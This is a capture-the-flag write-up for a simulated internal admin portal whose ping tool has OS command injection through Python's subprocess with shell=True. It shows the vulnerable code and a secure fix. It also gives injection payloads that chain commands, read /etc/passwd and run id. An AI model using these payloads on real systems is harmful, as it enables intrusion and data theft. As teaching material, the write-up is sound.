# CTF Writeup — ACME Internal Admin Portal

**Challenge Name:** ACME Internal Admin Portal  
**Category:** Web Exploitation  
**Difficulty:** Beginner / Intermediate  
**Flag:** `flag{internal_tools_should_not_use_shell_true}`  

---

## Overview

The ACME Internal Admin Portal is a simulated corporate IT administration dashboard that has been accidentally exposed to the public internet. The portal provides several network diagnostic utilities. One of these utilities contains a critical OS Command Injection vulnerability caused by insecure use of Python's `subprocess` module with `shell=True`.

The objective is to identify the vulnerable endpoint and exploit it to read the flag from the server's filesystem.

---

## Reconnaissance

### Step 1 — Browse the Application

Opening the application at `http://localhost:5000` reveals a dark-themed internal IT dashboard with four navigation sections:

- **Dashboard** — System status indicators, uptime, and recent alerts
- **Network Tools** — Ping utility, DNS lookup, port scanner
- **System Logs** — Server event log
- **About** — Company and portal information

The dashboard itself contains several interesting hints:

```
[WARN] Portal accessible from external IP — VPN restriction not enforced
[WARN] Input validation disabled on diagnostics endpoint
```

The "About" page also reveals that the auth service is disabled and the environment is unprotected.

### Step 2 — Examine the Network Tools Page

Navigating to `/tools` reveals three network diagnostic utilities:

| Tool         | Status  | Functional? |
|--------------|---------|-------------|
| Ping Utility | ACTIVE  | ✓ Yes       |
| DNS Lookup   | OFFLINE | ✗ No        |
| Port Scanner | OFFLINE | ✗ No        |

Only the **Ping Utility** is functional. This immediately focuses attention on it as the attack surface.

### Step 3 — Test the Ping Utility

Entering a valid IP address (e.g., `8.8.8.8`) and submitting the form produces:

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=12.3 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
```

The server executes a real shell command and returns the raw output. This is a strong indicator that the backend is using `subprocess` or similar functionality to run system commands.

---

## Vulnerability Discovery

### Step 4 — Examine the HTTP Request

When the form is submitted, the browser sends:

```
GET /ping?target=8.8.8.8 HTTP/1.1
```

The user-supplied `target` parameter is sent directly as a query string. There is no client-side filtering or indication of server-side validation.

### Step 5 — Identify the Vulnerability

Based on:
- A live ping result rendered from a real system command
- User input passed directly as a query parameter
- No visible validation or sanitization

The application appears to construct a shell command like:

```bash
ping -c 1 <target>
```

If `shell=True` is used in Python's `subprocess` module, shell metacharacters such as `;`, `&&`, `||`, and `|` will be interpreted by the shell, allowing command chaining.

This is a classic **OS Command Injection** vulnerability.

---

## Exploitation

### Step 6 — Craft the Injection Payload

The shell semicolon (`;`) terminates one command and begins another:

```
ping -c 1 8.8.8.8; cat flag.txt
```

This causes the server to execute two commands sequentially:
1. `ping -c 1 8.8.8.8` — runs normally
2. `cat flag.txt` — reads the flag file

### Step 7 — Deliver the Payload

Submit the following in the ping form, or send the request directly:

```
http://localhost:5000/ping?target=8.8.8.8;+cat+flag.txt
```

Or URL-encoded:

```
http://localhost:5000/ping?target=8.8.8.8%3B%20cat%20flag.txt
```

### Step 8 — Retrieve the Flag

The server response includes the combined output of both commands:

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=12.3 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 12.3/12.3/12.3/0.000 ms

flag{internal_tools_should_not_use_shell_true}
```

**Flag:** `flag{internal_tools_should_not_use_shell_true}`

---

## Alternative Payloads

Several other shell metacharacters also work:

| Payload                         | Behavior                            |
|---------------------------------|-------------------------------------|
| `8.8.8.8; cat flag.txt`         | Sequential execution                |
| `8.8.8.8 && cat flag.txt`       | Execute if ping succeeds            |
| `8.8.8.8 \| cat flag.txt`       | Pipe stdout                         |
| `; cat flag.txt`                | Skip ping entirely                  |
| `$(cat flag.txt)`               | Command substitution                |
| `8.8.8.8; ls`                   | List directory contents             |
| `8.8.8.8; id`                   | Reveal running user                 |
| `8.8.8.8; cat /etc/passwd`      | Read system user file               |

---

## Root Cause Analysis

### The Vulnerable Code

```python
# app.py — Lines ~55-65

result = subprocess.run(
    f"ping -c 1 {target}",   # <-- user input concatenated into command string
    shell=True,              # <-- shell=True allows metacharacter interpretation
    capture_output=True,
    text=True,
    timeout=10
)
```

**Two compounding mistakes:**

1. **`shell=True`** — Passes the command string to `/bin/sh -c`, which interprets shell metacharacters (`;`, `&&`, `|`, etc.)
2. **No input sanitization** — The `target` variable is inserted directly into the command string with no validation, escaping, or allowlist checking

When these two conditions exist together, any user-supplied input can inject arbitrary shell commands.

---

## Mitigation

### Secure Version

```python
import subprocess
import re

@app.route("/ping")
def ping():
    target = request.args.get("target", "")

    # 1. Validate input against a strict allowlist
    if not re.match(r'^[\d\.a-zA-Z\-]+$', target) or len(target) > 64:
        return render_template("tools.html", ping_result="Error: Invalid target.")

    # 2. Use argument list — NEVER shell=True with user input
    try:
        result = subprocess.run(
            ["ping", "-c", "1", target],  # Arguments as a list, not a string
            capture_output=True,
            text=True,
            timeout=10
            # shell=True is gone entirely
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "Error: Request timed out."

    return render_template("tools.html", ping_result=output)
```

### Why This Is Secure

| Fix                     | Why It Helps                                                  |
|-------------------------|---------------------------------------------------------------|
| `shell=False` (default) | Arguments are passed directly to the OS; no shell interprets metacharacters |
| Argument list           | Each element is a discrete argument — no concatenation        |
| Input validation        | Allowlist regex rejects `;`, `&&`, `\|`, spaces, etc.         |
| Length limit            | Prevents buffer-style abuse                                   |

### Additional Recommendations

- **Principle of least privilege** — Run the application as a non-root user
- **Network restriction** — Restrict portal access to internal VPN or IP allowlist
- **Authentication** — Add login before exposing any administrative tools
- **Output sanitization** — HTML-escape all command output before rendering
- **Disable debug mode** — Never run Flask with `debug=True` in production

---

## Lessons Learned

This challenge demonstrates one of the most dangerous categories of web vulnerability. OS Command Injection consistently appears in the OWASP Top 10 (A03: Injection) because:

- Developers conflate "it works" with "it is safe"
- `shell=True` is convenient and commonly misused
- The consequences are severe: full server compromise, data exfiltration, lateral movement

The remediation is straightforward: **never use `shell=True` with user-controlled input**, and always validate input against a strict allowlist before passing it anywhere near a system call.

---

## References

- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Python subprocess docs — Security Considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [CWE-78: Improper Neutralization of Special Elements in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [PortSwigger: OS Command Injection](https://portswigger.net/web-security/os-command-injection)
